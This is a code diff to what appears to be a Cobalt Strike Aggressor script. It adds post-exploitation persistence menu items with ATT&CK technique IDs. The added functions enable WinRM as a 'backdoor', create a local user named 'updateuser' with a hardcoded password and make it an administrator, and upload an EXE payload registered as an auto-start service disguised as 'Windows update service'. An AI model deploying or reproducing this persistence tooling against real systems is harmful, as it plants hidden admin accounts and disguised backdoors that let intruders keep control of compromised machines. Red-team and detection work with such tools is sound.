@@ -7,6 +7,18 @@
 #  Add checks for all persistence methods, ways to remove all persistence methods
 #  Add Mimikatz skeleton key module
 #  Add module for adding local/domain users
+#  
+#  MITRE ID: T1136
+#  Create domain user
+#  Create domain admin
+#
+#  MITRE ID: T1037
+#  Logon script EXE persistence
+#  Logon script PowerShell persistence
+#
+#  MITRE ID: T1128
+#  Netsh perstitence: https://github.com/outflanknl/NetshHelperBeacon
+#
 
 popup beacon_top {
 	menu "&Persistence"{
@@ -77,11 +89,92 @@ popup beacon_top {
 					PSPersistRegistryHKLM($bid);
 				}
 			}
+			item "&Service Persistence - Executable" {
+				local('$bid');
+				foreach $bid ($1) {
+					serviceEXECustom($bid);
+				}
+			}
+			item "&Enable WinRM Backdoor" {
+				local('$bid');
+				foreach $bid ($1) {
+					enableWinRM($bid);
+				}
+			}
+			item "&Add Local User" {
+				local('$bid');
+				foreach $bid ($1) {
+					addLocalUser($bid);
+				}
+			}
 		}
 	}
 }
 
+#  Bitsadmin Persistence - EXE
 
+#  Bits PowerShell Persistence - EXE
+
+#  Bitsadmin Persistence - PS
+
+#  Bits PowerShell Persistence - PS
+
+# WinRM Backdoor
+sub enableWinRM {
+	$bid = $1;
+
+	bpowershell($bid, 'Enable-PSRemoting -Force');
+}
+
+# Create local user, possibly add them to administrators group
+sub addLocalUser {
+	$bid = $1;
+
+	$dialog = dialog("Local User Persistence", %(username => 'updateuser', password => 'ThisPass1234!@', makeadmin => 'True'), lambda({
+		if ("$3['makeadmin']" ismatch 'True' || "$3['makeadmin']" ismatch 'False' ) {
+			bshell($bid, "net user /add '.$3['username'].' '.$3['password'].'");
+
+			if ("$3['makeadmin']" ismatch 'True') {
+				bshell($bid, "net localgroup administrators '.$3['username'].' /add");
+			}	
+		}
+		else {
+			berror($bid, "\c4Please enter True or False for the Make Admin field.");
+		}
+	}));
+}
+
+# Create a service to run a custom executable on startup
+sub serviceEXECustom {
+	$bid = $1;
+
+	$dialog = dialog("Custom EXE Service Persistence", %(servicename => "updatesvc", servicedesc => "Windows update service", servicedisplay => "Update Service", binpath => "C:\\Users\\$user\\AppData\\Local\\Temp", payloadfile => "Select EXE Payload..."), lambda({
+		if ("$3['payloadfile']" ismatch 'Select EXE Payload...') {
+			berror($bid, "\c4Please select a valid Payload file.");
+		}
+		else {
+			bcd($bid, $3['binpath']);
+			bupload($bid, $3['payloadfile']);
+			bshell($bid, "sc create '.$3['servicename'].' binPath= "'.$3['binpath'].$3['payloadfile'].'" start= auto DisplayName= '.$3['servicedisplay'].'");
+			bshell($bid, 'sc description '.$3['servicename'].' "'.$3['servicedesc'].'"');
+			bshell($bid, 'sc start "'.$3['servicename'].'"');
+		}
+	}));
+
+	dialog_description($dialog, "Service Persistence - Register a new service to execute a provided executable");
+
+	drow_text($dialog, "servicename", "Service Name:"); 
+	drow_text($dialog, "servicedesc", "Service Description:");
+	drow_text($dialog, "servicedisplay", "Service Display Name: ");
+	drow_text($dialog, "binpath", "Path to Uploaded Binary");
+	drow_file($dialog, "payloadfile", "Payload (EXE)");
+
+	dbutton_action($dialog, "Create");
+	dialog_show($dialog);	
+
+}
+
+# MITRE ID: T1053
 sub userScheduledTaskEXE  {
 	$bid = $1;
 	$user1 = beacon_info($bid, "user");
@@ -115,6 +208,7 @@ sub userScheduledTaskEXE  {
 
 }
 
+# MITRE ID: T1053
 sub userScheduledTaskDLL  {
 	$bid = $1;
 	$user1 = beacon_info($bid, "user");
